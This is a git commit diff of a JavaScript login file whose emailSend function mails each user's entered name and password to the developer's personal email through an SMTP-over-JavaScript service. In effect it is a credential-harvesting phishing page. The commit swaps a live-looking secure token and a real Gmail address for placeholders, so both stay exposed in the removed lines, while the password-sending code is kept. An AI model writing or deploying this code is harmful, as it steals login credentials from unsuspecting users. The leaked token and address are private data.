1f2faf0aaacb8d1d60816e75b890b7bb91fdd2b2
Ravi <87214299+Ravi2718@users.noreply.github.com>
2024-08-17 14:42:48 +0530

    Update login.js

--- login.js
+++ login.js
@@ -5,18 +5,12 @@ function emailSend() {
     var messageBody = "Name: " + userName + "<br/> Password: " + password;
     
     Email.send({
-        SecureToken: "be8ada82-ac4d-40c2-abbc-181e7cc079b8",
-        To: 'ravigeetha915@gmail.com',
-        From: "ravigeetha915@gmail.com",
+        SecureToken: "XXXXXXXXXXXXXXXXXXXXX",
+        To: 'Personal Email id ',
+        From: "Personal Email id ",
         Subject: "Login Attempt",
         Body: messageBody
     }).then(
-        // message => {
-        //     if (message === 'OK') {
-        //         alert("Email sent successfully!");
-        //     } else {
-        //         alert("Failed to send email!");
-        //     }
-        // }
+      
     );
 }
